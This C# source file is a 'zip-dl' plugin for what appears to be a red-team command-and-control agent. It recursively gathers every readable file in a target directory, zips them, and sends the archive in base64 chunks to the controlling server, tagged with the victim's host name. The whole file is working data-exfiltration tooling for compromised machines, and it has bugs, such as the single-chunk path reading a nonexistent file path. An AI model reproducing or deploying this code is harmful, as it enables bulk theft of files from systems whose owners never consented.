using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class DownloadJsonResponse
    {
        public int currentChunk { get; set; }
        public int totalChunks { get; set; }
        public string file_id { get; set; }

        public string ToJson()
        {
            return JsonSerializer.Serialize(this);
        }
    }
    public class Plugin : IFilePlugin
    {
        public string Name => "zip-dl";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private Dictionary<string, Stream> _streams = new Dictionary<string, Stream>();
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.agentConfig = config;
            this.downloadJobs = new();
        }
        long GetFolderSize(DirectoryInfo directoryInfo)
        {
            long totalSize = 0;

            // Get the size of all files in this directory and subdirectories
            FileInfo[] files = directoryInfo.GetFiles("*", SearchOption.AllDirectories);

            foreach (FileInfo file in files)
            {
                totalSize += file.Length;
            }

            return totalSize;
        }
        IEnumerable<string> GetFiles(string path)
        {
            var queue = new Queue<string>();
            queue.Enqueue(path);

            while (queue.Count > 0)
            {
                path = queue.Dequeue();

                try
                {
                    foreach (var subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch (Exception ex) when (ex is UnauthorizedAccessException or IOException or DirectoryNotFoundException)
                {
                    // Do nothing
                }

                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path);
                }
                catch (Exception ex) when (ex is UnauthorizedAccessException or DirectoryNotFoundException)
                {
                    // Do nothing
                }

                if (files == null)
                {
                    continue;
                }

                foreach (var t in files)
                {
                    yield return t;
                }
            }
        }

        void DebugWriteLine(string message, string task_id)
        {
            if (agentConfig.debug)
            {
                messageManager.WriteLine(message,task_id,false);
            }
        }

        public async Task Execute(ServerJob job)
        {
            ZipDlArgs args = JsonSerializer.Deserialize<ZipDlArgs>(job.task.parameters);

            Stream str = null;

            var dirInfo = new DirectoryInfo(args.source);

            long directorySize = GetFolderSize(dirInfo);

            if (!dirInfo.Exists)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Directory doesn't exist.",
                    completed = true,
                    status = "error"
                });
                return;
            }

            // Create a new in-memory zip archive
            if (args.write)
            {
                str = new FileStream(args.destination, FileMode.Create, FileAccess.ReadWrite, FileShare.None);
            }
            else
            {
                if (directorySize > 1073741824 && !args.force)
                {
                    await messageManager.AddResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = $"This zip is gonna be pretty big, the folder is ({directorySize}) bytes, consider specifying write=true to flush to disk first, or specify force=true to specify force it to be in memory",
                        completed = true,
                        status = "error"
                    });
                    return;
                }
                str = new MemoryStream();
            }

            using var archive = new ZipArchive(str, ZipArchiveMode.Create, true);
            var files = GetFiles(args.source).ToList();
            // For every file in the target folder
            foreach (var filename in files)
            {
                // Open the target file for reading
                FileStream fileStream;
                try
                {
                    DebugWriteLine($"Opening {filename} for reading", job.task.id);
                    fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read);
                }
                catch (FileNotFoundException e)
                {
                    DebugWriteLine($"File not found???", job.task.id);
                    continue;
                }
                catch (Exception e) when (e is System.Security.SecurityException or UnauthorizedAccessException
                                              or FileNotFoundException)
                {
                    DebugWriteLine($"Unauthorized access exception received, skipping", job.task.id);
                    continue;
                }

                // Create an entry in the zip file
                var fileEntry = archive.CreateEntry(filename, CompressionLevel.SmallestSize);

                // Open a writer on this new zip file entry
                using var entryStream = fileEntry.Open();
                using var streamWriter = new StreamWriter(entryStream);

                // Copy the contents of this file into the zip entry
                try
                {
                    fileStream.Seek(0, SeekOrigin.Begin);
                    fileStream.CopyTo(streamWriter.BaseStream);
                }
                catch (Exception e) when (e is IOException)
                {
                    DebugWriteLine($"Error reading file '{filename}': {Environment.NewLine}{e.ToString()}", job.task.id);
                }
            }
            // If we have nothing to write, let's bounce
            if (str.Length == 0)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Something caused the stream to fail.",
                    completed = true
                });
                return;
            }

            if (args.write)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = $"{str.Length} bytes written to {args.destination}.",
                    completed = true
                });
                return;
            }

            //Kickoff Upload
            _streams.Add(job.task.id, str);
            await StartSendFile(job, agentConfig.chunk_size, str.Length, dirInfo.Name);
        }
        private async Task StartSendFile(ServerJob server_job, int chunk_size, long stream_size, string file_name)
        {
            ServerDownloadJob job = new ServerDownloadJob(server_job, "", chunk_size);
            
            job.total_chunks = await GetTotalChunks(stream_size, chunk_size);
            job.path = $"{file_name}.zip";
            downloadJobs.GetOrAdd(job.task.id, job);


            await messageManager.AddResponse(new DownloadTaskResponse
            {
                user_output = new DownloadJsonResponse()
                {
                    currentChunk = 0,
                    totalChunks = job.total_chunks,
                    file_id = string.Empty,
                }.ToJson(),
                download = new DownloadTaskResponseData()
                {
                    total_chunks = job.total_chunks,
                    full_path = job.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = Environment.MachineName,
                },
                status = "processed",
                task_id = job.task.id,
                completed = false,
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            //Get Tracker job
            ServerDownloadJob downloadJob = this.GetJob(response.task_id);
            if (response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                string message = "Cancelled by user.";
                if (response.status != "success")
                {
                    message = "An error occurred while communicating with the server.";
                }
                await this.messageManager.WriteLine(message, response.task_id, true, "error");
                this.CompleteDownloadJob(response.task_id);
                return;
            }

            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            //Increment the chunk number
            downloadJob.chunk_num++;

            //Are we finished?
            bool completed = (downloadJob.chunk_num == downloadJob.total_chunks);

            //Prepare download response
            DownloadTaskResponse dr = new DownloadTaskResponse()
            {
                task_id = response.task_id,
                user_output = new DownloadJsonResponse()
                {
                    currentChunk = downloadJob.chunk_num,
                    totalChunks = downloadJob.total_chunks,
                    file_id = downloadJob.file_id,
                }.ToJson(),

                download = new DownloadTaskResponseData
                {
                    is_screenshot = false,
                    host = "",
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                status = completed ? String.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
                completed = (downloadJob.chunk_num == downloadJob.total_chunks),
            };

            //Download next chunk or return an error
            if (this.TryHandleNextChunk(downloadJob, out var chunk))
            {
                dr.download.chunk_data = chunk;
            }
            else
            {
                dr.user_output = chunk;
                dr.status = "error";
                dr.download.chunk_data = String.Empty;
                dr.completed = true;
            }

            //return our message
            await messageManager.AddResponse(dr.ToJson());

            if (dr.completed)
            {
                this.CompleteDownloadJob(response.task_id);
            }
        }
        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(long size, int chunk_size)
        {
            try
            {
                return (int)Math.Ceiling((double)size / chunk_size);
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);

            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams[task_id].Close();
                _streams[task_id].Dispose();
                _streams.Remove(task_id);
            }
            this.messageManager.CompleteJob(task_id);
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public bool TryHandleNextChunk(ServerDownloadJob job, out string chunk)
        {
            if (!_streams.ContainsKey(job.task.id))
            {
                chunk = "No stream available.";
                return false;
            }

            try
            {
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    chunk = Misc.Base64Encode(File.ReadAllBytes(job.path));
                    return true;
                }

                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
                byte[] buffer = new byte[job.chunk_size];

                if (_streams[job.task.id].Length - totalBytesRead < job.chunk_size)
                {
                    job.complete = true;
                    buffer = new byte[_streams[job.task.id].Length - job.bytesRead];
                }

                _streams[job.task.id].Seek(job.bytesRead, SeekOrigin.Begin);
                job.bytesRead += _streams[job.task.id].Read(buffer, 0, buffer.Length);
                chunk = Misc.Base64Encode(buffer);
                return true;
            }
            catch (Exception e)
            {
                job.complete = true;
                chunk = e.ToString();
                return false;
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
    }
}
